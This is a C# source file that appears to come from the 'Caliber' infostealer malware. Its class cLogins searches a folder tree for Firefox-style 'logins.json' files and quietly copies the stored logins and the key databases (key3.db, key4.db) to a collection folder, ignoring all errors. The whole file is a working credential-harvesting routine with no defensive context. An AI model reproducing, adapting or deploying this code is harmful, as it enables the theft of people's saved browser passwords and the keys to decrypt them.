﻿using System;
using System.IO;

namespace youknowcaliber.Passwords
{
	internal sealed class cLogins
	{
		private static void CopyDatabaseFile(string from, string sSavePath)
		{
			try
			{
				bool flag = File.Exists(from);
				if (flag)
				{
					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
				}
			}
			catch
			{
			}
		}

		public static void GetDBFiles(string path, string sSavePath)
		{
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
				bool flag2 = files == null;
				if (!flag2)
				{
					foreach (string path2 in files)
					{
						foreach (string path3 in cLogins.keyFiles)
						{
							cLogins.CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(path2), path3), sSavePath);
						}
					}
				}
			}
		}

		private static string[] keyFiles = new string[]
		{
			"key3.db",
			"key4.db",
			"logins.json"
		};
	}
}
